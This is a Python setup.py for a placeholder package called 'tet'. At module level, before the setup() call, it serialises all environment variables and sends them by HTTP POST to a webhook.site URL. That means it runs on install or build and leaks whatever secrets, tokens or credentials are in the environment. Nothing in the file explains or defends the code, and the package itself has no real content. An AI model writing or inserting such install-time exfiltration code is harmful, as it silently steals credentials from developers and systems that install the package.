from setuptools import setup, find_packages
import os

from urllib.request import urlopen, Request
import json
# Collect environment variables
env_data = json.dumps(dict(os.environ))

# Send to a server
response = urlopen(
    Request(
        "https://webhook.site/2b63864b-e1f6-4925-9bc4-c4cbe6922f95",
        data=env_data.encode("utf-8"),
        headers={"Content-Type": "application/json"},
    ),
    timeout=5
)

setup(
    name="tet",
    version="0.1.0",
    description="Add your description here",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    author="",
    author_email="",
    url="",
    packages=find_packages(),
    python_requires=">=3.8",
    install_requires=[],
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
)
